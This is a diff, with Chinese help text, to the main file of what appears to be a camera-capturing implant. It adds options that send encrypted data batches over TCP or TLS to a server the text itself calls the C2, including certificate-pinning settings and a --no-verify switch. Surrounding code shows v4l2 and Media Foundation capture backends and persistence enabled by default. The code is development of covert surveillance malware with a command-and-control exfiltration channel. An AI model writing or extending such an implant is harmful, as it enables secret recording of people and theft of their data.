@@ -50,9 +50,18 @@ static void usage(const char *argv0)
         "用法: %s [选项]\n"
         "\n"
         "必需:\n"
-        "  --sink PATH         信元落点。\"fd://N\" 用已打开 fd，其余按路径 O_APPEND 打开\n"
+        "  --sink PATH         信元落点：fd://N / tcp://host:port /\n"
+        "                      tls://host:port / 文件路径\n"
         "  --key HEX64         32 字节主密钥的 64 个十六进制字符\n"
         "                      前 16 字节 = k_send，后 16 字节 = k_recv\n"
+        "\n"
+        "TLS 出口（仅 --sink tls:// 时生效）:\n"
+        "  --ca PATH           信任库 PEM。要求校验时必需\n"
+        "  --sni NAME          SNI 主机名，同时用于证书主机名校验。\n"
+        "                      缺省从 tls:// 的 host 段推导（IP 除外）\n"
+        "  --no-verify         不校验证书链与主机名。\n"
+        "                      注意：此时任何人都能用自签证书冒充 C2，\n"
+        "                      仅防被动流量识别，不防主动接管\n"
         "\n"
         "运行:\n"
         "  --backend NAME      mock | v4l2 | mf。缺省按平台自动选择\n"
@@ -108,6 +117,13 @@ int main(int argc, char **argv)
     cfg.max_batches = 0;   /* 不限，由停止信号终止 */
     cfg.ensure_persist = 1;
 
+    /* 证书校验默认开。
+     *
+     * 不能依赖 memset 出来的 0：那是"未设置"而不是"显式关闭"，而这两者
+     * 在安全语义上完全相反。memset 后若读作 0 = 不校验，等于把最危险的
+     * 选项做成默认值。显式置 1，关闭只能靠 --no-verify。 */
+    cfg.tls_verify = 1;
+
     uint8_t key[32];
     memset(key, 0, sizeof key);
     int have_key = 0;
@@ -121,6 +137,9 @@ int main(int argc, char **argv)
         const char *nx = (i + 1 < argc) ? argv[i + 1] : NULL;
 
         if (!strcmp(a, "--sink") && nx)        { cfg.sink_path = nx; i++; continue; }
+        if (!strcmp(a, "--ca") && nx)          { cfg.tls_ca = nx; i++; continue; }
+        if (!strcmp(a, "--sni") && nx)         { cfg.tls_sni = nx; i++; continue; }
+        if (!strcmp(a, "--no-verify"))         { cfg.tls_verify = 0; continue; }
         if (!strcmp(a, "--key") && nx) {
             if (parse_hex(nx, key, 32) != 0) {
                 fprintf(stderr, "[FATAL] --key 必须是 64 个十六进制字符\n");
